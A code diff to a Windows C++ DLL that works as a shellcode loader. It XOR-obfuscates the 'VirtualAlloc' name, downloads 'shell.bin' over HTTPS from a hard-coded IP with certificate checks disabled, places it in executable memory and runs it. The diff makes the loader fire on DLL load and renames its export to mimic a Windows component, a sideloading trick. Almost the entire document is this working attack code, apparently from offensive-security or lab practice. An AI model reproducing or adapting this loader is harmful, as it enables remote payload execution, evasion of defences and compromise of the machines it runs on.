@@ -1,13 +1,17 @@
-
 #include "pch.h"
 #include <Windows.h>
 #include <WinInet.h>
 #include <iostream>
 #include <iomanip>
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
+#include <winhttp.h>
+#include <iostream>
+
+#pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "Wininet.lib")
 
 void decode_string(unsigned char* key, unsigned char* text, int size) {
-
     for (int x = 0; x < size; x++) {
         text[x] = text[x] ^ key[x];
     }
@@ -21,63 +25,105 @@ FARPROC load_func(LPCWSTR lib, LPCSTR function) {
 }
 
 void do_shit() {
-    // Open Internet connection
-    HINTERNET hInternet = InternetOpen(L"", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
-    if (hInternet == nullptr) {
+    
+    // Open a WinHttp session
+    HINTERNET hSession = WinHttpOpen(L"HTTPSClient/1.0",
+        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+       
         return;
     }
-    // Open HTTP connection
-    HINTERNET hUrl = InternetOpenUrl(hInternet, L"http://<YOUR WEB IP HERE>/shellm.bin", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
-    if (hUrl == nullptr) {
-        InternetCloseHandle(hInternet);
+
+    // Force TLS 1.2
+    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
+    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
+
+    // Connect to server
+    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.120.152", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) {
+     
+        WinHttpCloseHandle(hSession);
         return;
     }
 
-    // Get content length
-    DWORD contentLength = 0;
-    DWORD dwBufferSize = sizeof(DWORD);
-    HttpQueryInfo(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &contentLength, &dwBufferSize, nullptr);
-    HANDLE processHandle = GetCurrentProcess();
-    LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-    unsigned char vk[] = "\xf6\xa3\x29\xed\x46\xa1\x32\x6c\xb4\x9a\x83\xc9\xfc\x3d";
-    unsigned char vx[] = "\xa0\xca\x5b\x99\x33\xc0\x5e\x2d\xd8\xf6\xec\xaa\xb9\x45";
+    // Open request
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/shell.bin",
+        NULL, WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
 
-    decode_string(vk, vx, sizeof vx);
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
-    (FARPROC&)VirtualAllocEx = load_func((LPCWSTR)"kernel32", (LPCSTR)vx);
-    LPVOID lpMemory = VirtualAllocEx(processHandle, NULL, contentLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    // Send request
+    BOOL bResult = WinHttpSendRequest(hRequest,
+        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+        WINHTTP_NO_REQUEST_DATA, 0,
+        0, 0);
+    if (!bResult) {
+        
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Receive response
+    bResult = WinHttpReceiveResponse(hRequest, NULL);
+    if (!bResult) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return;
+    }
+
+    // Read data
+    DWORD dwSize = 0;
+    WinHttpQueryDataAvailable(hRequest, &dwSize);
+
+      
+        DWORD bytesRead = 0;
+
+
+        HANDLE processHandle = GetCurrentProcess();
+        LPVOID(WINAPI * VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+        unsigned char vk[] = "\xf6\xa3\x29\xed\x46\xa1\x32\x6c\xb4\x9a\x83\xc9\xfc\x3d";
+        unsigned char vx[] = "\xa0\xca\x5b\x99\x33\xc0\x5e\x2d\xd8\xf6\xec\xaa\xb9\x45";
+
+        decode_string(vk, vx, sizeof vx);
+
+        (FARPROC&)VirtualAllocEx = load_func((LPCWSTR)"kernel32", (LPCSTR)vx);
+        LPVOID lpMemory = VirtualAllocEx(processHandle, NULL, dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        
+    
+    WinHttpReadData(hRequest, lpMemory, dwSize, &bytesRead);
    
-    if (lpMemory == nullptr) {
-        InternetCloseHandle(hUrl);
-        InternetCloseHandle(hInternet);
-        return;
-    }
+    char* char_ptr = static_cast<char*>(lpMemory);
+    ((void(*)())char_ptr)();
 
-    DWORD bytesRead;
-    if (InternetReadFile(hUrl, lpMemory, contentLength, &bytesRead) && bytesRead == contentLength) {
-        char* char_ptr = static_cast<char*>(lpMemory);
-        ((void(*)())char_ptr)();
 
-    }
-    else {
         VirtualFree(lpMemory, 0, MEM_RELEASE);
-        InternetCloseHandle(hUrl);
-        InternetCloseHandle(hInternet);
-        return;
-    }
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+     
+}
 
-    // Close handles and free memory
-    VirtualFree(lpMemory, 0, MEM_RELEASE);
-    InternetCloseHandle(hUrl);
-    InternetCloseHandle(hInternet);
-    return;
-
-} 
-
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
-
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
+        do_shit();
+        break;
     case DLL_PROCESS_DETACH:
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
@@ -86,12 +132,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     return TRUE;
 }
 
-
 extern "C" {
-    __declspec(dllexport) BOOL WINAPI update(void) {
-
+    __declspec(dllexport) BOOL WINAPI DoMsCtfMonitor(void) {
         do_shit();
         return TRUE;
     }
-    
 }
+
